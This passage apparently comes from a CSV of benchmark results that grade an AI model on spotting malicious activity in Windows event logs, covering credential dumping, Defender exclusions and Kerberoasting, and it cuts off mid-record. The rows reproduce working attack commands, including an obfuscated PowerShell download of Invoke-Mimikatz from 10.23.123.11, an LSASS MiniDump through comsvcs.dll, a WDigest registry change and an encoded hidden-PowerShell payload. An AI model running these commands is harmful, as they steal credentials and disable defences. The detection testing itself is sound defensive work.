101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A114A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99A97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) )",10.23.123.11,,0.0,141.46,4.2,6.0,4.0,3,17.2,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4104, 4103
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A114A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99A97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) )
+- Network: 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show PowerShell executing a heavily obfuscated command that attempts to download and execute `Invoke-Mimikatz.ps1` from an external IP address (10.23.123.11). The script explicitly attempts to disable SSL certificate validation and set security protocols to weak versions (SSL3, TLS1.0/1.1/1.2) to bypass security controls. The activity was blocked by antivirus software, confirming the malicious nature of the credential theft tool invocation."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104 Defender exclusion added (PowerShell).evtx,medium,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104",powershell.exe,OFFSEC\admmig,"Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', PSConsoleHostReadLine, Out-Default, Set-StrictMode -Off",,,0.0,11.53,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4103, 4104
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', PSConsoleHostReadLine, Out-Default, Set-StrictMode -Off
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the user `OFFSEC\admmig` executing `Set-MpPreference` commands to add exclusions for a path named `c:\document\virus\` and the `.exe` file extension. This activity is a common technique used by attackers to disable Windows Defender protections and allow malicious executables to run without detection. The sequential execution of these commands within a short timeframe indicates a deliberate attempt to evade security controls."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5145-4624-DonPAPI full extraction.csv,,,error,NO,0.0,0.0,NO,,,,,,,,0.18,,,,,,,Error: HTTP 400
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,90.0,YES,"1, 12, 13","reg.exe, cmd.exe",OFFSEC\admmig,"reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1, ""C:\Windows\system32\cmd.exe""",,"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,4.44,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 12, 13
+- Processes: reg.exe, cmd.exe
+- Accounts: OFFSEC\admmig
+- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1, ""C:\Windows\system32\cmd.exe"" 
+- Network: None
+- Registry: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
+
+EXPLANATION:
+The logs show the modification of the WDigest registry key to enable `UseLogonCredential`, a technique commonly used to store plaintext credentials in memory for subsequent dumping. This activity is explicitly flagged by Sysmon rules for Credential Dumping (T1003) and Registry Modification (T1112), indicating a clear attempt to facilitate credential theft."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,68.9,YES,"18, 1, 7, 11, 10","wmiprvse.exe, powershell.exe, rundll32.exe, lsass.exe",OFFSEC\admmig,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",,,0.0,8.51,4.1,6.0,4.0,4,18.1,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 18, 1, 7, 11, 10
+- Processes: wmiprvse.exe, powershell.exe, rundll32.exe, lsass.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show a clear attempt to dump the Local Security Authority Subsystem Service (LSASS) memory using `comsvcs.dll` via `rundll32.exe`, a common technique for stealing credentials. This activity was initiated by `powershell.exe` spawned from `wmiprvse.exe`, indicating potential lateral movement or remote execution. The creation of the dump file `C:\Windows\Temp\76nivOxA.dmp` confirms the successful execution of this malicious command."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 10","mimikatz.exe, cmd.exe, lsass.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","mimikatz.exe, ""C:\Windows\system32\cmd.exe"" , cmd.exe",,,0.0,4.31,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 10
+- Processes: mimikatz.exe, cmd.exe, lsass.exe
+- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
+- Commands: mimikatz.exe, ""C:\Windows\system32\cmd.exe"" , cmd.exe
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the execution of `mimikatz.exe`, a well-known credential dumping tool, followed by a process access event where `mimikatz.exe` accessed `lsass.exe` with `GrantedAccess` `0x1010` (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION). This sequence indicates an attempt to dump credentials from the Local Security Authority Subsystem Service, which is a definitive indicator of credential theft and malicious activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,admmig,,,,0.0,2.51,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 11
+- Processes: C:\Windows\System32\Taskmgr.exe
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The creation of an LSASS memory dump file (`lsass (4).DMP`) by `Taskmgr.exe` is a strong indicator of credential harvesting, as attackers often use Task Manager to dump LSASS memory to extract credentials. This activity is not typical for routine administrative tasks and suggests an attempt to steal sensitive authentication data."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID11-Mimikatz LSA SSP clear text password exfiltration.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\system32\lsass.exe,,,,,0.0,2.50,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 11
+- Processes: C:\Windows\system32\lsass.exe
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The creation of `C:\Windows\System32\mimilsa.log` by `lsass.exe` is a strong indicator of credential dumping using Mimikatz, as this file is a known artifact of that tool. The associated MITRE ATT&CK technique T1003 (OS Credential Dumping) confirms the malicious intent of accessing LSASS memory to steal credentials."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104-Firewall configuration enumerated (PowerShell).evtx,hard,C,error,NO,0.0,0.0,NO,,,,,,,,0.45,,,,,,,Error: HTTP 400
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4103-4104 - SPN discovery (moder nPowerShell).evtx,hard,C,processed,YES,100.0,75.0,YES,"4104, 4103, 4100",powershell.exe,OFFSEC\admmig,"$SPNName = 'MSSQLSvc/Svc-SQL-DB01.offsec.lan', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName",,,0.0,8.10,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4104, 4103, 4100
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: $SPNName = 'MSSQLSvc/Svc-SQL-DB01.offsec.lan', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The logs show the user `OFFSEC\admmig` executing PowerShell commands to load the `System.IdentityModel` assembly and attempt to create a `KerberosRequestorSecurityToken` for a specific SQL Service Principal Name (SPN). This sequence of commands is characteristic of a Kerberoasting attack, where an attacker requests service tickets for service accounts to crack their passwords offline. The error message indicating a failure to create the Kerberos credential confirms the attempt to request a service ticket for the target service."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,YES,100.0,90.0,YES,6004,,,,"10.23.23.9, non-existing.lan., google.com., hacking-zone.lan.",,0.0,3.02,5.4,6.0,4.0,2,17.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 6004, 6004, 6004
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan.
+- Registry: None
+
+EXPLANATION:
+The logs show a single source IP (10.23.23.9) querying a non-existent domain followed by a known malicious domain (""hacking-zone.lan"") within a short timeframe, which is indicative of DNS tunneling or C2 communication attempts. The progression from a non-existing domain to a specific attacker-associated domain suggests an attempt to establish a covert channel or resolve malicious infrastructure."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5145-DNS hosts files access via network share.evtx,easy,A,processed,YES,100.0,83.3,YES,5145,,admmig,,10.23.23.9,,0.0,4.15,5.0,5.0,4.0,3,17.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5145
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The logs show a single user account (admmig) accessing the C$ administrative share from a remote IP (10.23.23.9) to read the hosts file and traverse system directories within a very short timeframe. This pattern of remote administrative share access targeting sensitive system files like `Windows\System32\Drivers\etc\hosts` is indicative of reconnaissance or potential host file manipulation attempts, which is not typical routine activity."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4624-Anonymous login with domain specified (DonPapi).evtx,easy,A,processed,YES,100.0,100.0,YES,4624,,"ANONYMOUS LOGON, admmig",,10.23.123.11,,0.0,8.04,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624
+- Processes: None
+- Accounts: ANONYMOUS LOGON, admmig
+- Commands: None
+- Network: 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The logs show a rapid sequence of successful network logons (Event ID 4624) from the same IP address (10.23.123.11) within a very short timeframe, initially as 'ANONYMOUS LOGON' and then repeatedly as the user 'admmig'. This pattern of multiple successful authentications in seconds from a single source is indicative of automated brute-force attacks or credential stuffing attempts. The transition from anonymous access to specific user account access suggests an attacker probing for valid credentials or exploiting weak authentication mechanisms."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4661-Local group enumeration with RID brutforce with CME.evtx,easy,A,processed,NO,100.0,100.0,YES,"4661, 4662",C:\Windows\System32\lsass.exe,"admmig, ROOTDC1$",,,,0.0,52.95,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 4661, 4662
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: admmig, ROOTDC1$
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The events show the Local System account (ROOTDC1$) and a service account (admmig) accessing SAM and Active Directory objects via the legitimate Local Security Authority Subsystem Service (lsass.exe). This pattern is characteristic of normal domain controller operations, such as directory synchronization and security descriptor updates, rather than malicious activity. There are no suspicious command executions, network connections, or unauthorized privilege escalations observed."
+Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4624,4688,5140,5145-Eternal Romance - MS17_010_psexec (GLOBAL).csv",,,processed,YES,100.0,88.0,YES,"1102, 4964, 4672, 4624, 5140, 5145, 4688, 4673","cmd.exe, powershell.exe, conhost.exe, lsass.exe","admmig, FS03VULN$, LOCAL SERVICE","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))' | $s.UseShellExecute=$false | $s.RedirectStandardOutput=$true | $s.WindowStyle='Hidden' | $s.CreateNoWindow=$true | $p=[System.Diagnostics.Process]::Start($s) | "", powershell.exe  -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | "", \??\C:\Windows\system32\conhost.exe 0xffffffff, ""C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe"" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA==''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","10.23.123.11, 10.23.23.9",,16.7,93.75,5.3,6.0,3.3,4,18.6,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 5140, 5145, 4688, 4673
+- Processes: cmd.exe, powershell.exe, conhost.exe, lsass.exe
+- Accounts: admmig, FS03VULN$, LOCAL SERVICE
+- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPg2gWACA7VWbW+bSBD+nEj5D6iyBKiOIbbbvEiVbgFju4kdbBI7sWud1rCGbRbWgSWO0/a/32CgTa/pXXvSIb/sy8zszDPPzrDKYk9QHku+w91M+nSwv+fgBEeSUouy9fqkLtXSsaPu7cFGjXd7+K30TlLmaL22eIRpvDg7M7MkIbEo5o0uEShNSbRklKSKKn2WpiFJyOHl8iPxhPRJqv3Z6DK+xKwU25rYC4l0iGI/37vgHs4darhrRoUif/ggq/PDo0Wjc59hliqyu00FiRo+Y7IqfVHzA6+2a6LIA+olPOUr0ZjSuNVsXMcpXpEhWHsgAyJC7qeyCmHAJyEiS2KpCCi3UOwrMgydhHvI9xOSpnJdmue254vFH8q8PHicxYJGpNGPBUn42iXJA/VI2ujh2GdkTFYL0HJFQuNgoaog9sDviFKLM8bq0u+YUYZkU8H2q0rKcyWQckSi1iGXLwU64H7GSKEqv+BpQQAVnpIEAN6Xg/2D/VXFGc82njMGRnvz3ZiAe4rDU7oTeyfpdWkA52DBky1Ma1dJRtTFV3AhEcGbSf3n+keVMIgKi03PYW0+4dRfgE6Z01rQub/M13/OTYusaEysbYwj6lX0U17CmawY2cXYqMSG4JUilxvEtwgjARY5cHm6f1DrRFR81TUyynySIA9ylYJXkEb1e2eKXChyPx6QCEAq5sC/2gpITyrpkujb6vR8DkKyyXCa1iUng1vn1SWXYEb8uoTilJZbKBN8N5S/uTvImKAeTkVlbqFWOJbnmTxORZJ5kDeI/cpdE49ilkNRl3rUJ8bWpUF1rvwiECZmDK4CWHqARMBKDoArcjYk4OIu82rDJaIfrRmJQGZ3/W2GA7jsJeF39MEB8eW/e1jxuSBvjkUFwjP/IMEu46IuTWgioIrkuO5o9N/Of1ZAdp6YCSlzoVRXZG5sRc7s2qOXU7KEZQdCIgAAO+GRgVPytl1UCuWVdkkdBM+t1XNnfeEO4GvB1+7HbLA6cYTOI9rq84Fnpk7XPkF0E2y8kyHy/Pc+OXUnbeF2+sJ0UG9EdaMdeoZ+tRsHt/QoCJA/HIUe051OdDHsp4/apjfNbRU2vHa7d6OjVqt92dLvALhc5w50Irp5vIAxlMTLC6OfGnqfdd6b4+W0ac+mrKe17XA15an79tbSNO3Ux9Zgi5DB/dZge3M05lc9LzLaMddOzfYd6iBkxp2JbfDzWyNBjjbBwZqboX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGP